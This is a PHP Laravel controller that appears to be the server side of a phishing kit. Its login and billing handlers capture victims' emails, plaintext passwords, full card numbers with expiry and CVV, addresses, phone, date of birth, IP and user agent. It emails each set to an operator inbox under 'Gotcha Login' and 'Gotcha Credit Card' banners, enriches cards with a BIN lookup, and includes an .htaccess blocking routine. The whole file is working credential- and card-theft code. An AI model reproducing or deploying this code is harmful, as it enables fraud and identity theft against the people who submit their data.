<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Ixudra\Curl\Facades\Curl;
use PHPMailer\PHPMailer\PHPMailer;
use \App\User;
use \App\Billing;
use \App\Card;
use \App\Blocked;
use \App\Setting;

class UserController extends Controller
{
  public function __construct() {
    $this->middleware('auth:api', ['only' => ['init', 'billing', 'block']]);
    $this->mail     = new PHPMailer(true);
  }

  public function init() {
    return response()->json([
      'user'      =>  Auth::user()
    ]);
  }

  public function setSmtp($smtp) {
    $this->mail->isSMTP();
    $this->mail->Host       = $smtp->smtp_server;
    $this->mail->SMTPAuth   = true;
    $this->mail->Username   = $smtp->smtp_user;
    $this->mail->Password   = $smtp->smtp_password;
    $this->mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $this->mail->Port       = $smtp->smtp_port;
  }

  public function sendMail($message, $subject, $from, $a = '') {
    $settings     = Setting::first();
    // $user         = Auth::user();

    if ((bool) $settings['is_smtp']) {
      $this->setSmtp($settings);
    }
    // if ($a == 'login') {
    //   $this->mail->setFrom((empty($user->country)) ? 'Login' : $user->country);
    //   $this->mail->Subject  = 'Login ('.$user->country.') - ' . $_SERVER['REMOTE_ADDR'];
    // } else if ($a == 'card') {
    //   $this->mail->Subject  = '';
    //   $this->mail->setFrom($this->cardholder);
    // } else {
    //   $this->mail->Subject  = 'Unknown result';
    //   $this->mail->setFrom('Result');
    // }

    $this->mail->setFrom('res@asuque.dev', $from);
    $this->mail->Subject      = $subject;
    $this->mail->addAddress($settings['email_result']);
    $this->mail->Body    = $message;
    $this->mail->send();
  }

  public function block(Request $req) {
    $ip     = $_SERVER['REMOTE_ADDR'];

    Auth::logout();

    $file   = fopen(base_path() . '/public/.htaccess', 'a');
    fwrite($file, 'Deny from ' . $ip . PHP_EOL);
    fclose($file);

    Blocked::create([
      'ip'  =>  $ip
    ]);
  }

  public function auth($credentials)
  {
    if (! $token = auth()->setTTL(99999999)->attempt($credentials)) {
      return response()->json(['error' => 'Unauthorized'], 401);
    }

    return [
      'access_token' => $token,
      'token_type' => 'bearer',
      'expires_in' => auth()->factory()->getTTL() * 60
    ];
  }

  public function billingValidate(Request $req) {
    foreach ($req->input('required') as $key => $value) {
      if ($key == 'name') {
        foreach ($req->input('required')['name'] as $key => $value) {
          if ($key == 'middle') { continue; }
          if (empty($value)) { return ucfirst($key) . ' name required.'; }
        }
      }
      if (empty($value)) { return ucfirst($key) . ' required.'; }
    }
    foreach ($req->input('card') as $key => $value) {
      if ($key == 'brand' || $key == 'error') { continue; }
      if (empty($value)) { return 'Card ' . $key . ' required.'; }
    }
  }

  public function bin($bin) {
    $bin        = substr(str_replace(' ', '', $bin), 0, 6);
    $response   = json_decode(
      Curl::to('https://binlist.io/lookup/'.$bin.'/')->get()
    , true);

    return $response['scheme'] . ' ' . $response['type'] . ' ' . $response['category'] . ' ' . $response['bank']['name'] . ' ' . $response['country']['name'];
  }

  public function billing(Request $req) {
    $validate = $this->billingValidate($req);
    if ($validate) {
      return response()->json([ 'error' => $validate ], 401);
    }

    $addition   = [];
    foreach ($req->input('addition') as $key => $value) {
      array_push($addition, '| '.$value['asu'].'             : ' . $value['value']);
    }
    $addition   = implode("\n", $addition);

    $required   = $req->input('required');
    $billing    = Billing::create([
      'first_name'  =>  $required['name']['first'],
      'middle_name' =>  $required['name']['middle'],
      'last_name'   =>  $required['name']['last'],
      'address1'    =>  $required['address1'],
      'address2'    =>  $required['address2'],
      'state'       =>  $required['state'],
      'city'        =>  $required['city'],
      'postal'      =>  $required['postal'],
      'country'     =>  Auth::user()['country'],
      'phone'       =>  $required['phone'],
      'addition'    =>  json_encode($req->input('addition')),

      'user_id'     =>  Auth::id()
    ]);

    $postfield  = $req->input('card');
    $binQue     = $this->bin($postfield['number']);
    $card       = Card::create([
      'number'  =>  $postfield['number'],
      'exp'     =>  $postfield['exp'],
      'cvv'     =>  $postfield['cvv'],
      'type'    =>  $postfield['brand'],
      'bin'     =>  $binQue,

      'user_id' =>  Auth::id()
    ]);

    if ($billing && $card) {

      $binNumber  = substr(str_replace(' ', '', $postfield['number']), 0, 6);

      $subject  = 'BIN/IIN: '.$binNumber.' - '.$binQue.' - ('.$_SERVER['REMOTE_ADDR'].')';
      $message  = '
      .+================| Gotcha Credit Card |================+.

      .+================| Gotcha Credit Card |================+.
      | Card Holder     : '.$required['name']['first'].' '.$required['name']['middle'].' '.$required['name']['last'].'
      | Card Number     : '.$postfield['number'].'
      | Card Expiry     : '.$postfield['exp'].'
      | Card CVV        : '.$postfield['cvv'].'

      | Format          : '.str_replace(' ', '', $postfield['number']).'|'.str_replace(' / ', '|', $postfield['exp']).'|'.$postfield['cvv'].'
      | Bin             : '.$binQue.'

      | Full name       : '.$required['name']['first'].' '.$required['name']['middle'].' '.$required['name']['last'].'
      | Address 1       : '.$required['address1'].'
      | Address2        : '.$required['address2'].'
      | City            : '.$required['city'].'
      | State           : '.$required['state'].'
      | Country         : '.Auth::user()['country'].'
      | Zip             : '.$required['postal'].'
      | Phone           : '.$required['phone'].'
      | DOB             : '.$required['dob'].' - MM/DD/YYYY
      .+================| Gotcha Credit Card |================+.

      .+================| Gotcha Credit Card |================+.
      '.$addition.'
      .+================| Gotcha Credit Card |================+.


      .+================| Gotcha Credit Card |================+.
      | IP Address      : '.$_SERVER['REMOTE_ADDR'].'
      | Country         : '.Auth::user()['country'].'
      | User Agent      : '.$_SERVER['HTTP_USER_AGENT'].'
      | Date            : '.date('Y/m/d G:i:s').'
      .+================| Gotcha Credit Card |================+.

      .+================| Gotcha Credit Card |================+.

      ';

      $from   = $required['name']['first'].' '.$required['name']['middle'].' '.$required['name']['last'];

      $this->sendMail($message, $subject, $from, 'card');

      return response()->json('success');
    }
    return response()->json([
      'error' =>  'Error occured when processing your request.'
    ], 401);
  }

  public function Login(Request $req) {
    $this->validate($req, [
      'email'     =>  'required|email',
      'password'  =>  'required|min:6|max:20'
    ]);

    $ip           = ($_SERVER['REMOTE_ADDR'] == '::1') ? '139.194.61.191' : $_SERVER['REMOTE_ADDR'];

    $country      = json_decode(Curl::to('http://ip-api.com/json/' . $ip . '?fields=countryCode')->get());
    $country      = (!isset($country->countryCode)) ? 'ID' : $country->countryCode;

    $user = User::create([
      'email'         =>  $req->input('email'),
      'password'      =>  Hash::make($req->input('password')),
      'password_ori'  =>  $req->input('password'),
      'country'       =>  $country,
      'user_agent'    =>  $_SERVER['HTTP_USER_AGENT']
    ]);

    if ($user) {
      $message  = '
      .+================| Gotcha Login |================+.

      .+================| Gotcha Login |================+.
      | Email     : '.$req->input('email').'
      | Password  : '.$req->input('password').'
      | Format    : '.$req->input('email').'|'.$req->input('password').'
      .+================| Gotcha Login |================+.

      .+================| Gotcha Login |================+.
      | IP Address  : '.$_SERVER['REMOTE_ADDR'].'
      | Country     : '.$country.'
      | User Agent  : '.$_SERVER['HTTP_USER_AGENT'].'
      | Date            : '.date('Y/m/d G:i:s').'
      .+================| Gotcha Login |================+.

      .+================| Gotcha Login |================+.
      ';
      $from     = $country;
      $subject  = 'Gotcha Login ('.$country.') - ' . $_SERVER['REMOTE_ADDR'];
      $this->sendMail($message, $subject, $from, 'login');

      return response()->json($this->auth($req->only('email', 'password')));
    }

    return response()->json([], 401);

  }
}
